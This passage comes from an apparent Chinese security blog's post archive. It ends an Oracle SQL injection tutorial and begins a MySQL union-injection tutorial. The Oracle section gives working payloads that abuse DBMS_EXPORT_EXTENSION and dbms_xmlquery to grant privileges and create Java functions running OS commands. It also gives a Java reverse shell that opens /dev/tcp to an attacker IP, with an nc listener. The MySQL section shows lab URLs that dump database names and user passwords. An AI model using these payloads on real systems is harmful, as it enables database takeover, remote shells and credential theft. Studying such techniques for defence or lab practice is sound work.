<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on LinxRunCMD to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><strong>执行系统命令</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.LinxRunCMD(<span class="string">&#x27;/bin/bash -c /usr/bin/whoami&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061057322.png" alt="46a99a5f54c8a8cbadca2549dd53d9fe.png"></p>
<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext()"></a>dbms_xmlquery.newcontext()</h3><blockquote>
<ul>
<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>必须在DBMS_PORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功s</li>
</ul>
</blockquote>
<p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p><strong>赋予当前用户Java权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--当前用户查看</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission(&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;YY&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;execute&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p>通过以下命令可以查看all_objects内部改变：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%LINX%&#x27;</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%Linx%&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061105963.png" alt="image-20211006110557755"></p>
<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p>判断是否创建成功</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">&#x27;LINXRUNCMD&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061106049.png" alt="image-20211006110629889" style="zoom:50%;"></p>
<p>也可通过查看all_objects内部改变判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%LINX%&#x27;</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%Linx%&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061107441.png" alt="image-20211006110714309"></p>
<p>若想删除创建的函数，通过以下命令删除</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> LinxRunCMD</span><br></pre></td></tr></table></figure>
<p><strong>执行命令</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> LinxRunCMD(<span class="string">&#x27;id&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061059370.png" alt="2849daa3c5c2ade13eb918a3ca0ad502.png"></p>
<h3 id="dbms-java-test-funcall"><a href="#dbms-java-test-funcall" class="headerlink" title="dbms_java_test.funcall()"></a>dbms_java_test.funcall()</h3><blockquote>
<ul>
<li>影响版本： 10g R2, 11g R1, 11g R2</li>
<li>权限：Java Permissions</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;pwd &gt; /tmp/pwd.txt&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p>执行时报如下错</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061108594.png" alt="5bf9bd61e8d2fa65abe45e7a3506eb08.png"></p>
<p>但不影响命令的执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061108224.png" alt="image-20211006110810998"></p>
<p>该方式无回显，在注入时不太方便利用，但可通过此方式反弹。</p>
<h2 id="Java反弹Shell"><a href="#Java反弹Shell" class="headerlink" title="Java反弹Shell"></a>Java反弹Shell</h2><p>在提权操作中如果遇到无回显情况，如上部分第三种方法，可以通过反弹shell的方式，在自己VPS上利用nc监听端口。以此来执行交互式执行命令（类似带外通信）。</p>
<h3 id="编译payload"><a href="#编译payload" class="headerlink" title="编译payload"></a>编译payload</h3><p>java源代码（linux系统的payload）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shellRev</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                System.out.println(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;run();&#125;</span><br><span class="line">                <span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                String[] aaa=&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;</span>&#125;;</span><br><span class="line">                Process p=Runtime.getRuntime().exec(aaa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">javac shellRev.java</span><br><span class="line">#执行</span><br><span class="line">java shellRev</span><br></pre></td></tr></table></figure>
<h3 id="使用Java执行-1"><a href="#使用Java执行-1" class="headerlink" title="使用Java执行"></a>使用Java执行</h3><p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><strong>赋予Java权限</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;</span><span class="string">&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;begin dbms_java.grant_permission( &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;PUBLIC&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYS:java.net.SocketPermission&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;&gt;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;*&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; );end;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;;END;&#x27;</span><span class="string">&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) from dual</span><br></pre></td></tr></table></figure>
<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function reversetcp RETURN VARCHAR2 as language java name &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;shell.run() return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p><strong>赋予函数执行权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on reversetcp to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.reversetcp <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<p>shell命令行输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -vv -l p 8080</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061110384.png" alt="image-20211006110855525" style="zoom:50%;"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/wise_man/article/details/5288918">Oracle grant revoke 总结_wise_man的专栏-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/yw0219/p/5855210.html">Oracle权限管理详解 - 舒山 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://mp.weixin.qq.com/s/MYkvQDpYZbz67F6qK9Ri0g">看了这个,谁还怕Oracle注入?(有彩蛋) (qq.com)</a></li>
<li><a href="https://www.cnblogs.com/-qing-/p/10949562.html">Oracle报错注入总结 - 卿先生 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/">Oracle注入 - 命令执行&amp;Shell反弹 | redn3ck’s blog</a></li>
<li><a href="https://www.cnblogs.com/micr067/p/12763325.html">Oracle数据库提权 - micr067 - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL数据库注入攻击方式</title>
    <url>/post/c2f49bfa.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="MySQL数据库基本知识"><a href="#MySQL数据库基本知识" class="headerlink" title="MySQL数据库基本知识"></a>MySQL数据库基本知识</h2><h3 id="MySQL数据库介绍"><a href="#MySQL数据库介绍" class="headerlink" title="MySQL数据库介绍"></a>MySQL数据库介绍</h3><p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。</p>
<p>MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。由于其社区版的性能卓越，搭配PHP和Apache可组成良好的开发环境。</p>
<p>MySQL服务的默认端口：3306</p>
<h3 id="常见的SQL语句"><a href="#常见的SQL语句" class="headerlink" title="常见的SQL语句"></a>常见的SQL语句</h3><p>创建数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE database_name;</span><br></pre></td></tr></table></figure>
<p>删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP DATABASE database_name;</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>
<p>创建数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name(id INT(10),username VARCHAR(20) NOT NULL,password VARCHAR(128),PRIMARY(id));</span><br></pre></td></tr></table></figure>
<p>查看数据表结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC table_name;</span><br></pre></td></tr></table></figure>
<p>插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name(username,password) VALUE(&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>
<p>查询数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
<p>更新数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE table_name <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;admin123&#x27;</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>删除数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="MySQL相关函数与常量"><a href="#MySQL相关函数与常量" class="headerlink" title="MySQL相关函数与常量"></a>MySQL相关函数与常量</h3><ul>
<li><p>system_user() 系统用户名</p>
</li>
<li><p>user() 用户名</p>
</li>
<li><p>current_user() 当前用户名</p>
</li>
<li><p>session_user() 连接数据库的用户名</p>
</li>
<li><p>database() 数据库名</p>
</li>
<li><p>version() mysql数据库版本</p>
</li>
<li><p>load_file() mysql读取本地文件的函数</p>
</li>
<li><p>@@datadir 读取数据库路径</p>
</li>
<li><p>@@basedir mysql安装路径</p>
</li>
<li><p>@@version_compile_os 操作系统版本</p>
</li>
</ul>
<h3 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h3><p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
<p><strong>information_schema数据库表说明：</strong></p>
<ul>
<li>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</li>
<li>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</li>
<li>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</li>
<li>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li>
<li>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>
<li>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</li>
<li>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</li>
<li>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</li>
<li>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</li>
<li>COLLATIONS表：提供了关于各字符集的对照信息。</li>
<li>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</li>
<li>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</li>
<li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li>
<li>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</li>
<li>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</li>
<li>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。</li>
</ul>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起，使用为此为UNINO或UNION ALL。</p>
<p>利用前提条件：页面上有回显位。</p>
<p>什么是回显位？</p>
<p>在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫回显位。</p>
<p><strong>联合注入的过程</strong></p>
<ol>
<li>判断注入点</li>
<li>判断闭合类型</li>
<li>判断查询列数</li>
<li>判断回显位</li>
<li>获取数据库名</li>
<li>获取数据表名</li>
<li>获取字段名</li>
<li>获取数据</li>
</ol>
<p>以下使用SQLi-LAB Less-1做演示，使用的数据库为MySQL。</p>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>在参数后面直接添加单引号，显示数据库错误信息或者页面回显不同说明存在注入点</p>
<p><img src="https://i.loli.net/2021/10/05/fjedIBHz96tm7sJ.png" alt="efd00f30ca438d55b6d660f80ad2b67f.png"></p>
<h3 id="判断是闭合类型"><a href="#判断是闭合类型" class="headerlink" title="判断是闭合类型"></a>判断是闭合类型</h3><p><code>http://hackrock.com:811/Less-1/?id=1&#39; and 1=1 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/AhtWReY9IQpaJEo.png" alt="bf4901f9e301c3f8898a08fdf9689855.png"></p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; and 1=2 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/O23b6LAp9azcPKv.png" alt="6453ef15aa63127adbe9679021aa521d.png"></p>
<p>使用<code>&#39;and 1=1</code> 显示正常数据，而使用<code>&#39;and 1=2</code>不显示数据，由此可以判断出该注入的闭合类型为单引号闭合</p>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次类推。</p>
<p>当排序的列数为3时，发现页面正常显示，说明查询列数≥3</p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; order by 3 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/CgUasOhqmipowzF.png" alt="548836a22752bc5f1e18bd4f4f170e50.png"></p>
<p>当排序的列数为4时，发现页面报错，说明查询列数&lt;4，由此可以判断出查询列数为3</p>
<p><code>http://hackrock.com:811/Less-1/?id=1&#39; order by 4 --+</code></p>
<p><img src="https://i.loli.net/2021/10/05/u3Yd7s1NcFVIvBf.png" alt="8ac563257d8084d76e4949c0cc865943.png"></p>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><p>UNION的作用是将两个select查询结果合并。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
<p><code>http://hackrock.com:811/Less-1/?id=-1&#39; union select 1,2,3 --+</code></p>
<p>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
<p><img src="https://i.loli.net/2021/10/05/tL8R4YCDuq9IQsX.png" alt="bfba3026d7a7dde5a4a5d4dc900e3f67.png"></p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>获取数据库版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,version() --+</span><br></pre></td></tr></table></figure>
<p>获取当前数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
<p>获取所有数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>获取security数据库的所有表名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><p>获取security数据库的users表中的字段名（列名）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>获取当前页面查询数据中的username和password字段中的所有值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-1/?id=-1&#x27; union select 1,2,group_concat(&#x27;&lt;br&gt;&#x27;,username,&#x27;~&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>MySQL字符串连接函数：</p>
<ol>
<li><p>concat()函数 功能：将多个字符串连接成一个字符串。</p>
<p>语法：concat(str1, str2,…)</p>
<p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
</li>
<li><p>concat_ws()函数</p>
<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符</p>
<p>语法：concat_ws(separator, str1, str2, …)</p>
<p>说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</p>
</li>
<li><p>group_concat()函数</p>
<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
</li>
</ol>
</blockquote>
